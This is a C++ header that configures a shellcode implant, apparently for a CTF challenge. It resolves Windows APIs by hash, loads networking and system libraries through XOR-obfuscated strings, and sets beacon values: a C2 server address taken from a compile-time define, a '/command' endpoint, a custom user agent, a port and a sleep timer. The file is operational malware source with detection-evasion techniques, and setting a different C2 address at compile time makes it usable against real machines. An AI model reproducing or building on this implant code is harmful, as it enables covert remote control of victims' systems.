#ifndef _SHELLCODE_CONFIG_HPP
#define _SHELLCODE_CONFIG_HPP

#include "api_hashing.hpp"
#include "config_type.hpp"
#include "obfuscated_string.hpp"
#include "memory.hpp"

// Hardcoded config values for CTF challenge shellcode
// No resource loading - all values embedded directly

inline int init_shellcode_config(config_t* config) {
    // Resolve base modules
    config->kernel32 = get_module_handle(HASH_KERNEL32);
    config->ntdll = get_module_handle(HASH_NTDLL);

    if (!config->kernel32 || !config->ntdll) {
        ERROR_LOG("Failed to get kernel32 or ntdll");
        return 1;
    }

    // Get memory management functions
    config->fn_get_process_heap = (fnGetProcessHeap)get_proc_address(config->kernel32, GETPROCESSHEAP);
    config->fn_heap_alloc = (fnHeapAlloc)get_proc_address(config->ntdll, RTLALLOCATEHEAP);
    config->fn_heap_free = (fnHeapFree)get_proc_address(config->kernel32, HEAPFREE);
    config->fn_heap_re_alloc = (fnHeapReAlloc)get_proc_address(config->ntdll, RTLREALLOCATEHEAP);

    if (!config->fn_get_process_heap || !config->fn_heap_alloc || !config->fn_heap_free || !config->fn_heap_re_alloc) {
        ERROR_LOG("Failed to get heap functions");
        return 1;
    }

    // Load additional modules
    typedef HMODULE (WINAPI* fnLoadLibraryA)(const char*);
    fnLoadLibraryA fn_load_library_a = (fnLoadLibraryA)get_proc_address(config->kernel32, LOADLIBRARYA);
    if (!fn_load_library_a) {
        ERROR_LOG("Failed to get LoadLibraryA");
        return 1;
    }

    XOR_STR("user32.dll", user32_str);
    XOR_STR("winhttp.dll", winhttp_str);
    XOR_STR("advapi32.dll", advapi32_str);
    XOR_STR("shell32.dll", shell32_str);
    XOR_STR("gdi32.dll", gdi32_str);
    XOR_STR("winmm.dll", winmm_str);

    config->user32 = fn_load_library_a(user32_str);
    config->winhttp = fn_load_library_a(winhttp_str);
    config->advapi32 = fn_load_library_a(advapi32_str);
    config->shell32 = fn_load_library_a(shell32_str);
    config->gdi32 = fn_load_library_a(gdi32_str);
    config->winmm = fn_load_library_a(winmm_str);

    DEBUG("Loaded modules: user32=%p winhttp=%p advapi32=%p", config->user32, config->winhttp, config->advapi32);

    // Allocate and set hardcoded config values
    config->server = (wchar_t*)alloc_mem(config, MAX_SERVER_SIZE * 2);
    config->endpoint = (wchar_t*)alloc_mem(config, MAX_ENDPOINT_SIZE * 2);
    config->agent = (wchar_t*)alloc_mem(config, MAX_AGENT_SIZE * 2);
    config->binary_name = (char*)alloc_mem(config, MAX_BINARY_NAME_SIZE);

    if (!config->server || !config->endpoint || !config->agent || !config->binary_name) {
        ERROR_LOG("Failed to allocate config memory");
        return 1;
    }

    // C2 Server from compile-time define (C2_IP environment variable)
    // Default value if not provided at compile time
    #ifndef C2_IP
    #define C2_IP "127.0.0.1"
    #endif

    // XOR_WSTR expects a string literal, C2_IP is already a string from -DC2_IP=\"...\"
    XOR_WSTR(C2_IP, server_wstr);

    size_t server_len = 0;
    while (server_wstr[server_len] != L'\0' && server_len < MAX_SERVER_SIZE - 1) {
        config->server[server_len] = server_wstr[server_len];
        server_len++;
    }
    config->server[server_len] = L'\0';

    // Endpoint: /command
    XOR_WSTR("/command", endpoint_wstr);
    for (size_t i = 0; i < 9; i++) {
        config->endpoint[i] = endpoint_wstr[i];
    }

    // Agent: CTFAgent/1.0
    XOR_WSTR("CTFAgent/1.0", agent_wstr);
    for (size_t i = 0; i < 13; i++) {
        config->agent[i] = agent_wstr[i];
    }

    // Binary name: shellcode.bin
    XOR_STR("shellcode.bin", binary_str);
    for (size_t i = 0; i < 14; i++) {
        config->binary_name[i] = binary_str[i];
    }

    // C2 Port from compile-time define (C2_PORT environment variable)
    #ifndef C2_PORT
    #define C2_PORT 8080
    #endif
    config->port = C2_PORT;

    // Sleep timer: 1000ms
    config->sleep_timer = 1000;

    INFO_SUCCESS("Shellcode config initialized successfully");
    return 0;
}

inline void unload_shellcode_config(config_t* config) {
    if (config->server) {
        dealloc_mem(config, config->server);
        config->server = NULL;
    }
    if (config->endpoint) {
        dealloc_mem(config, config->endpoint);
        config->endpoint = NULL;
    }
    if (config->agent) {
        dealloc_mem(config, config->agent);
        config->agent = NULL;
    }
    if (config->binary_name) {
        dealloc_mem(config, config->binary_name);
        config->binary_name = NULL;
    }
}

#endif // _SHELLCODE_CONFIG_HPP
